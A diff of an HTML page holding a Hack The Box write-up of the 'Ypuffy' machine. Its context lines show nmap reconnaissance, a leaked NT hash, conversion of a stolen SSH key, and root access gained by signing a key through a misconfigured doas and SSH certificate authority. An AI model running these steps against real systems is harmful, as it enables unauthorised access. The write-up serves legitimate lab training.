@@ -17,16 +17,16 @@ The output is quite big. You can the output here.
 The script tries to get as much information as possible of your target and in this case shows some LDAP information
 and the following open ports:
 
-  
-      
-          Open Ports
-      
-  
-  
-      
-          22, 80, 139, 389, 445
-      
-  
+	
+			
+					Open Ports
+			
+	
+	
+			
+					22, 80, 139, 389, 445
+			
+	
 
 
   Explore
@@ -36,25 +36,25 @@ The sambaNTPassword Hash immediately caught my attention.">
 <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
 <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
 <meta name="color-scheme" content="light dark"><meta property="og:url" content="https://www.tagnull.de/docs/HTB-Writeups/ypuffy/">
-  <meta property="og:site_name" content="www.tagnull.de">
-  <meta property="og:title" content="Ypuffy">
-  <meta property="og:description" content="External Recon # Let’s start with nmap. But let’s spice it up a bit with an additional script:
+	<meta property="og:site_name" content="www.tagnull.de">
+	<meta property="og:title" content="Ypuffy">
+	<meta property="og:description" content="External Recon # Let’s start with nmap. But let’s spice it up a bit with an additional script:
 nmap -sC -sV -oN initial --script discovery 10.10.10.107
 The output is quite big. You can the output here.
 The script tries to get as much information as possible of your target and in this case shows some LDAP information and the following open ports:
 Open Ports 22, 80, 139, 389, 445 Explore # The sambaNTPassword Hash immediately caught my attention.">
-  <meta property="og:locale" content="en">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="docs">
-    <meta property="article:published_time" content="2019-02-09T00:00:00+00:00">
-    <meta property="article:modified_time" content="2019-02-09T00:00:00+00:00">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="docs">
+		<meta property="article:published_time" content="2019-02-09T00:00:00+00:00">
+		<meta property="article:modified_time" content="2019-02-09T00:00:00+00:00">
 <title>Ypuffy | www.tagnull.de</title>
 <link rel="manifest" href="/manifest.json">
 <link rel="icon" href="/logo.png" >
 <link rel="canonical" href="https://www.tagnull.de/docs/HTB-Writeups/ypuffy/">
-<link rel="stylesheet" href="/book.min.c8d213ad53b0e74b4a5b6fd785e46d9391863be06d16a90f25baa546f9255961.css" integrity="sha256-yNITrVOw50tKW2/XheRtk5GGO&#43;BtFqkPJbqlRvklWWE=" crossorigin="anonymous">
+<link rel="stylesheet" href="/book.min.a01a62135461eeae0a96c8c4313d37bcbcbd8305780dc247b8ba4b82131dbedb.css" integrity="sha256-oBpiE1Rh7q4KlsjEMT03vLy9gwV4DcJHuLpLghMdvts=" crossorigin="anonymous">
   <script defer src="/fuse.min.js"></script>
-  <script defer src="/en.search.min.c1a640087ca9581469f318b576cf4bd233a82c02e1349334d840c7940a557905.js" integrity="sha256-waZACHypWBRp8xi1ds9L0jOoLALhNJM02EDHlApVeQU=" crossorigin="anonymous"></script>
+  <script defer src="/en.search.min.96ba587ab96b163b63e753783fd2e8775f3ae8fee15c469d39182619e54674d0.js" integrity="sha256-lrpYerlrFjtj51N4P9Lod1866P7hXEadORgmGeVGdNA=" crossorigin="anonymous"></script>
 <!--
 Made with Book Theme
 https://github.com/alex-shpak/hugo-book
@@ -448,23 +448,23 @@ https://github.com/alex-shpak/hugo-book
 <p>The script tries to get as much information as possible of your target and in this case shows some LDAP information
 and the following open ports:</p>
 <table>
-  <thead>
-      <tr>
-          <th style="text-align: center">Open Ports</th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td style="text-align: center">22, 80, 139, 389, 445</td>
-      </tr>
-  </tbody>
+	<thead>
+			<tr>
+					<th style="text-align: center">Open Ports</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center">22, 80, 139, 389, 445</td>
+			</tr>
+	</tbody>
 </table>
 <h1 id="explore">
   Explore
   <a class="anchor" href="#explore">#</a>
 </h1>
 <p>The <code>sambaNTPassword</code> Hash immediately caught my attention.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B</span></span></code></pre></div>
 <p>
   <img src="alice-hash.png" alt="Alice-Hash" /></p>
 <p>As this is very juicy information. I paused my enumeration and tried to exploit this.
@@ -488,7 +488,7 @@ share:</p>
 <p>After downloading the file, and trying to use it as a key to access ssh I got an error.
 This format is not compatible with ssh. So, I tried converting it. A quick googlesearch helped
 me finding the correct command for this task. But first we need to install putty-tools.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>puttygen my_private_key.ppk -O private-openssh -o id_rsa
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>puttygen my_private_key.ppk -O private-openssh -o id_rsa
 </span></span><span style="display:flex;"><span>mv ~/.ssh
 </span></span><span style="display:flex;"><span>chmod <span style="color:#ae81ff">600</span> id_rsa
 </span></span><span style="display:flex;"><span>ssh -i id_rsa alice1978@10.10.10.107</span></span></code></pre></div>
@@ -511,13 +511,13 @@ This was the route I took to root the box.</p>
 a folder &ldquo;userca&rdquo;.<br>
 &ldquo;CA&rdquo; in this context mostly means &ldquo;Certificate Authority&rdquo; and is there to sign certificates or issue new keys. Let&rsquo;s say: &ldquo;ssh&rdquo;.</p>
 <p>Furthermore BSD has something like <code>sudo</code>, called <code>doas</code>. Let&rsquo;s check what we can do on this box.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ypuffy$ cat /etc/doas.conf
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ypuffy$ cat /etc/doas.conf
 </span></span><span style="display:flex;"><span>permit
 </span></span><span style="display:flex;"><span>keepenv :wheel
 </span></span><span style="display:flex;"><span>permit nopass alice1978 as userca cmd /usr/bin/ssh-keygen</span></span></code></pre></div>
 <p>We indeed can run <code>ssh-keygen</code>. But when we try, we are prompted for a password. Let&rsquo;s dig deeper in the ssh route.
 There&rsquo;s a password somewhere for sure.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ypuffy$ cat sshd_config
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ypuffy$ cat sshd_config
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>AuthorizedPrincipalsCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type<span style="color:#f92672">=</span>principals&amp;username<span style="color:#f92672">=</span>%u</span></span></code></pre></div>
 <p>So, apparently we can issue a <code>curl</code> to the &ldquo;CA&rdquo;&hellip;I guess, not sure what happens here. I still need to look this up&hellip;</p>
@@ -537,11 +537,11 @@ It&rsquo;s very easy to use.</p>
 <br></li>
 </ul>
 <p>Let&rsquo;s get back to the <code>curl</code> command and check what we can do with it:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ypuffy$ /usr/local/bin/curl <span style="color:#e6db74">&#34;http://127.0.0.1/sshauth?type=principals&amp;username=root&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ypuffy$ /usr/local/bin/curl <span style="color:#e6db74">&#34;http://127.0.0.1/sshauth?type=principals&amp;username=root&#34;</span>
 </span></span><span style="display:flex;"><span>3m3rgencyB4ckd00r</span></span></code></pre></div>
 <p>For whatever reason we get this string back: <code>3m3rgencyB4ckd00r</code> - obviously the missing password.
 Let&rsquo;s create a key and try signing it.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ypuffy$ ssh-keygen -t rsa
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ypuffy$ ssh-keygen -t rsa
 </span></span><span style="display:flex;"><span>ypuffy$ mv id_rsa.pub /tmp
 </span></span><span style="display:flex;"><span>ypuffy$ doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -n 3m3rgencyB4ckd00r -I <span style="color:#e6db74">&#34;algo&#34;</span> -z <span style="color:#ae81ff">1</span> id_rsa.pub
 </span></span><span style="display:flex;"><span>  Signed user key id_rsa-cert.pub: id <span style="color:#e6db74">&#34;algo&#34;</span> serial <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">for</span> 3m3rgencyB4ckd00r valid forever
@@ -551,7 +551,7 @@ Let&rsquo;s create a key and try signing it.</p>
   Root Flag
   <a class="anchor" href="#root-flag">#</a>
 </h1>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ypuffy$ ssh root@localhost
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ypuffy$ ssh root@localhost
 </span></span><span style="display:flex;"><span>OpenBSD 6.3 <span style="color:#f92672">(</span>GENERIC<span style="color:#f92672">)</span> <span style="color:#75715e">#100: Sat Mar 24 14:17:45 MDT 2018</span>
 </span></span><span style="display:flex;"><span>ypuffy# id
 </span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>wheel<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>wheel<span style="color:#f92672">)</span>, 2<span style="color:#f92672">(</span>kmem<span style="color:#f92672">)</span>, 3<span style="color:#f92672">(</span>sys<span style="color:#f92672">)</span>, 4<span style="color:#f92672">(</span>tty<span style="color:#f92672">)</span>, 5<span style="color:#f92672">(</span>operator<span style="color:#f92672">)</span>, 20<span style="color:#f92672">(</span>staff<span style="color:#f92672">)</span>, 31<span style="color:#f92672">(</span>guest<span style="color:#f92672">)</span>
